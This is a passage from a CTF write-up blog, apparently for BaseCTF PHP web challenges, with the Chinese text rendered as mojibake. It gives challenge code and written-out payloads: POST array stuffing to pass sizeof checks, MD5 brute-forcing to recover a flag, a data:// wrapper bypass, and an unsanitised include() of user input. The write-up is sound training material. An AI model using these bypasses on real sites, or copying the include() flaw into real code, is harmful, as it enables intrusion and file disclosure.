class=\"headerlink\" title=\"Bypass\"></a>Bypass</h1><h2 id=\"sizeof-POST-â€˜lenâ€™-sizeof-array\"><a href=\"#sizeof-POST-â€˜lenâ€™-sizeof-array\" class=\"headerlink\" title=\"sizeof($_POST[â€˜lenâ€™]) &#x3D;&#x3D; sizeof($array)\"></a>sizeof($_POST[â€˜lenâ€™]) &#x3D;&#x3D; sizeof($array)</h2><h3 id=\"basectf\"><a href=\"#basectf\" class=\"headerlink\" title=\"basectf\"></a>basectf</h3><h3 id=\"ç©åŸç¥ç©çš„\"><a href=\"#ç©åŸç¥ç©çš„\" class=\"headerlink\" title=\"ç©åŸç¥ç©çš„\"></a>ç©åŸç¥ç©çš„</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;len&#x27;</span>]) == <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$array</span>)) &#123;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">ys_open</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tip&#x27;</span>]);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;é”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒ&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ys_open</span>(<span class=\"params\"><span class=\"variable\">$tip</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable\">$tip</span> != <span class=\"string\">&quot;æˆ‘è¦ç©åŸç¥&quot;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;æˆ‘ä¸ç®¡ï¼Œæˆ‘è¦ç©åŸç¥ï¼ğŸ˜­ğŸ˜­ğŸ˜­&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">dumpFlag</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">dumpFlag</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;m&#x27;</span>]) || <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;m&#x27;</span>]) != <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;å¯æ¶çš„QQäººï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"variable\">$a</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;m&#x27;</span>][<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"variable\">$b</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;m&#x27;</span>][<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>(<span class=\"variable\">$a</span>) || <span class=\"keyword\">empty</span>(<span class=\"variable\">$b</span>) || <span class=\"variable\">$a</span> != <span class=\"string\">&quot;100%&quot;</span> || <span class=\"variable\">$b</span> != <span class=\"string\">&quot;love100%&quot;</span> . <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$a</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;æŸç«™å´©äº†ï¼Ÿè‚¯å®šæ˜¯æŸå¿½æ‚ å¹²çš„ï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\">  <span class=\"variable\">$flag</span>[] = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"variable\">$ii</span> = <span class=\"number\">0</span>;<span class=\"variable\">$ii</span> &lt; <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$array</span>);<span class=\"variable\">$ii</span>++) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$flag</span>[<span class=\"variable\">$ii</span>] = <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$array</span>[<span class=\"variable\">$ii</span>]) ^ <span class=\"variable\">$ii</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">json_encode</span>(<span class=\"variable\">$flag</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ç¬¬ä¸€éƒ¨åˆ†\"><a href=\"#ç¬¬ä¸€éƒ¨åˆ†\" class=\"headerlink\" title=\"ç¬¬ä¸€éƒ¨åˆ†\"></a>ç¬¬ä¸€éƒ¨åˆ†</h3><h4 id=\"sizeof-POST-â€˜lenâ€™-sizeof-array-1\"><a href=\"#sizeof-POST-â€˜lenâ€™-sizeof-array-1\" class=\"headerlink\" title=\"sizeof($_POST[â€˜lenâ€™]) &#x3D;&#x3D; sizeof($array)\"></a>sizeof($_POST[â€˜lenâ€™]) &#x3D;&#x3D; sizeof($array)</h4><p>å¯ä»¥å…ˆåœ¨æœ¬åœ°çœ‹ä¸€ä¸‹<code>sizeof($_POST[&#39;len&#39;])</code>çš„è¿”å›å€¼æ˜¯ä»€ä¹ˆ</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;len&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$lenCount</span> = <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;len&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Length of len array: &quot;</span> . <span class=\"variable\">$lenCount</span>; <span class=\"comment\">// åº”è¯¥è¾“å‡º 45</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&#x27;len&#x27; parameter is not set.&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241013150514357.png\" alt=\"image-20241013150514357\"></p>\n<p>å¯è§<strong>POSTä¼ å‡ æ¬¡lenè¿”å›å€¼å°±æ˜¯å‡ </strong></p>\n<p>è¿™é‡Œå¹¶ä¸çŸ¥é“<code>sizeof($array)</code>é•¿åº¦æ˜¯å¤šå°‘ï¼Œè¿›è¡Œçˆ†ç ´è¯•å‡ºæ¥æ˜¯45ï¼Œpayload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:</span><br><span class=\"line\">len[]=0&amp;len[]=1&amp;len[]=2&amp;len[]=3&amp;len[]=4&amp;len[]=5&amp;len[]=6&amp;len[]=7&amp;len[]=8&amp;len[]=9&amp;len[]=10&amp;len[]=11&amp;len[]=12&amp;len[]=13&amp;len[]=14&amp;len[]=15&amp;len[]=16&amp;len[]=17&amp;len[]=18&amp;len[]=19&amp;len[]=20&amp;len[]=21&amp;len[]=22&amp;len[]=23&amp;len[]=24&amp;len[]=25&amp;len[]=26&amp;len[]=27&amp;len[]=28&amp;len[]=29&amp;len[]=30&amp;len[]=31&amp;len[]=32&amp;len[]=33&amp;len[]=34&amp;len[]=35&amp;len[]=36&amp;len[]=37&amp;len[]=38&amp;len[]=39&amp;len[]=40&amp;len[]=41&amp;len[]=42&amp;len[]=43&amp;len[]=44</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ç¬¬äºŒéƒ¨åˆ†\"><a href=\"#ç¬¬äºŒéƒ¨åˆ†\" class=\"headerlink\" title=\"ç¬¬äºŒéƒ¨åˆ†\"></a>ç¬¬äºŒéƒ¨åˆ†</h3><p>è¿‡äºç®€å•ï¼Œç›´æ¥ç»™payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET:</span><br><span class=\"line\">?tip=æˆ‘è¦ç©åŸç¥</span><br><span class=\"line\">POST:</span><br><span class=\"line\">len[]=0&amp;len[]=1&amp;len[]=2&amp;len[]=3&amp;len[]=4&amp;len[]=5&amp;len[]=6&amp;len[]=7&amp;len[]=8&amp;len[]=9&amp;len[]=10&amp;len[]=11&amp;len[]=12&amp;len[]=13&amp;len[]=14&amp;len[]=15&amp;len[]=16&amp;len[]=17&amp;len[]=18&amp;len[]=19&amp;len[]=20&amp;len[]=21&amp;len[]=22&amp;len[]=23&amp;len[]=24&amp;len[]=25&amp;len[]=26&amp;len[]=27&amp;len[]=28&amp;len[]=29&amp;len[]=30&amp;len[]=31&amp;len[]=32&amp;len[]=33&amp;len[]=34&amp;len[]=35&amp;len[]=36&amp;len[]=37&amp;len[]=38&amp;len[]=39&amp;len[]=40&amp;len[]=41&amp;len[]=42&amp;len[]=43&amp;len[]=45&amp;m[0]=100%25&amp;m[1]=love100%2530bd7ce7de206924302499f197c7a966</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ç¬¬ä¸‰éƒ¨åˆ†\"><a href=\"#ç¬¬ä¸‰éƒ¨åˆ†\" class=\"headerlink\" title=\"ç¬¬ä¸‰éƒ¨åˆ†\"></a>ç¬¬ä¸‰éƒ¨åˆ†</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\">  <span class=\"variable\">$flag</span>[] = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"variable\">$ii</span> = <span class=\"number\">0</span>;<span class=\"variable\">$ii</span> &lt; <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$array</span>);<span class=\"variable\">$ii</span>++) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$flag</span>[<span class=\"variable\">$ii</span>] = <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$array</span>[<span class=\"variable\">$ii</span>]) ^ <span class=\"variable\">$ii</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">json_encode</span>(<span class=\"variable\">$flag</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>å°†è¾“å‡ºçš„å¯†æ–‡è¿›è¡Œè§£å¯†</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$md5</span> = [</span><br><span class=\"line\">    <span class=\"string\">&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;</span>, <span class=\"string\">&quot;26657d5ff9020d2abefe558796b99584&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;</span>, <span class=\"string\">&quot;ec8956637a99787bd197eacd77acce5e&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span>, <span class=\"string\">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span>, <span class=\"string\">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;f457c545a9ded88f18ecee47145a72c0&quot;</span>, <span class=\"string\">&quot;03afdbd66e7929b125f8597834fa83a4&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;093f65e080a295f8076b1c5722a46aa2&quot;</span>, <span class=\"string\">&quot;03afdbd66e7929b125f8597834fa83a4&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;698d51a19d8a121ce581499d7b701668&quot;</span>, <span class=\"string\">&quot;d82c8d1619ad8176d665453cfb2e55f0&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class=\"string\">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;7f39f8317fbdb1988ef4c628eba02591&quot;</span>, <span class=\"string\">&quot;07e1cd7dca89a1678042477183b7ac3f&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;a1d0c6e83f027327d8461063f4ac58a6&quot;</span>, <span class=\"string\">&quot;7f6ffaa6bb0b408017b62254211691b5&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;d67d8ab4f4c10bf22aa353e27879133c&quot;</span>, <span class=\"string\">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span>, <span class=\"string\">&quot;5fd0b37cd7dbbb00f97ba6ce92bf5add&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;67c6a1e7ce56d3d6fa748ab6d9af3fd7&quot;</span>, <span class=\"string\">&quot;3416a75f4cea9109507cacd8e2f2aefc&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class=\"string\">&quot;1c383cd30b7c298ab50293adfecb7b18&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;3416a75f4cea9109507cacd8e2f2aefc&quot;</span>, <span class=\"string\">&quot;da4fb5c6e93e74d3df8527599fa62642&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>, <span class=\"string\">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;735b90b4568125ed6c3f678819b6e058&quot;</span>, <span class=\"string\">&quot;14bfa6bb14875e45bba028a21ed38046&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;fc490ca45c00b1249bbe3554a4fdf6fb&quot;</span>, <span class=\"string\">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>, <span class=\"string\">&quot;98f13708210194c475687be6106a3b84&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;3c59dc048e8850243be8079a5c74d079&quot;</span>, <span class=\"string\">&quot;fc490ca45c00b1249bbe3554a4fdf6fb&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;33e75ff09dd601bbe69f351039152189&quot;</span>, <span class=\"string\">&quot;4e732ced3463d06de0ca9a15b6153677&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;33e75ff09dd601bbe69f351039152189&quot;</span>, <span class=\"string\">&quot;c16a5320fa475530d9583c34fd356ef5&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span></span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ç”¨äºå­˜å‚¨è¿˜åŸå‡ºçš„å­—ç¬¦</span></span><br><span class=\"line\"><span class=\"variable\">$flag</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">count</span>(<span class=\"variable\">$md5</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$j</span> = <span class=\"number\">0</span>; <span class=\"variable\">$j</span> &lt; <span class=\"number\">256</span>; <span class=\"variable\">$j</span>++) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// è®¡ç®—å¼‚æˆ–æ“ä½œåçš„å€¼</span></span><br><span class=\"line\">        <span class=\"variable\">$xor_result</span> = <span class=\"variable\">$j</span> ^ <span class=\"variable\">$i</span>;</span><br><span class=\"line\">        <span class=\"comment\">// è®¡ç®—MD5å€¼</span></span><br><span class=\"line\">        <span class=\"variable\">$calculated_md5</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$xor_result</span>);</span><br><span class=\"line\">        <span class=\"comment\">// å¦‚æœè®¡ç®—å‡ºçš„MD5å€¼ä¸ç»™å®šçš„MD5å€¼åŒ¹é…ï¼Œåˆ™æ‰¾åˆ°äº†æ­£ç¡®çš„å­—ç¬¦</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$calculated_md5</span> === <span class=\"variable\">$md5</span>[<span class=\"variable\">$i</span>]) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$flag</span> .= <span class=\"title function_ invoke__\">chr</span>(<span class=\"variable\">$j</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;Flag: &quot;</span> . <span class=\"variable\">$flag</span> . <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"url-è§£æè§„åˆ™\"><a href=\"#url-è§£æè§„åˆ™\" class=\"headerlink\" title=\"url@è§£æè§„åˆ™\"></a>url@è§£æè§„åˆ™</h2><h3 id=\"basectf-1\"><a href=\"#basectf-1\" class=\"headerlink\" title=\"basectf\"></a>basectf</h3><h3 id=\"Auraé…±çš„ç¤¼ç‰©\"><a href=\"#Auraé…±çš„ç¤¼ç‰©\" class=\"headerlink\" title=\"Auraé…±çš„ç¤¼ç‰©\"></a>Auraé…±çš„ç¤¼ç‰©</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"comment\">// Aura é…±ï¼Œæ¬¢è¿å›å®¶~</span></span><br><span class=\"line\"><span class=\"comment\">// è¿™é‡Œæœ‰ä¸€ä»½ç¤¼ç‰©ï¼Œè¯·ä½ ç­¾æ”¶ä¸€ä¸‹å“Ÿ~</span></span><br><span class=\"line\"><span class=\"variable\">$pen</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pen&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$pen</span>) !== <span class=\"string\">&#x27;Aura&#x27;</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ç¤¼ç‰©æ”¶åˆ°å•¦ï¼Œæ¥ä¸‹æ¥è¦å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~</span></span><br><span class=\"line\"><span class=\"variable\">$challenge</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;challenge&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$challenge</span>, <span class=\"string\">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class=\"number\">0</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$blog_content</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$challenge</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$blog_content</span>, <span class=\"string\">&#x27;å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦&#x27;</span>) === <span class=\"literal\">false</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;è¯·å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// å˜¿å˜¿ï¼Œæ¥ä¸‹æ¥è¦æ‹†å¼€ç¤¼ç‰©å•¦ï¼Œæ‚„æ‚„å‘Šè¯‰ä½ ï¼Œç¤¼ç‰©åœ¨ flag.php é‡Œé¢å“¦~</span></span><br><span class=\"line\"><span class=\"variable\">$gift</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;gift&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"variable\">$gift</span>); </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ç¬¬ä¸€éƒ¨åˆ†-1\"><a href=\"#ç¬¬ä¸€éƒ¨åˆ†-1\" class=\"headerlink\" title=\"ç¬¬ä¸€éƒ¨åˆ†\"></a>ç¬¬ä¸€éƒ¨åˆ†</h3><h4 id=\"data-å†™å…¥\"><a href=\"#data-å†™å…¥\" class=\"headerlink\" title=\"data:&#x2F;&#x2F;å†™å…¥\"></a>data:&#x2F;&#x2F;å†™å…¥</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$pen</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pen&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$pen</span>) !== <span class=\"string\">&#x27;Aura&#x27;</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:</span><br><span class=\"line\">pen=data://text/plain,Aura</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ç¬¬äºŒéƒ¨åˆ†-1\"><a href=\"#ç¬¬äºŒéƒ¨åˆ†-1\" class=\"headerlink\" title=\"ç¬¬äºŒéƒ¨åˆ†\"></a>ç¬¬äºŒéƒ¨åˆ†</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$challenge</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;challenge&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$challenge</span>, <span class=\"string\">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class=\"number\">0</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span 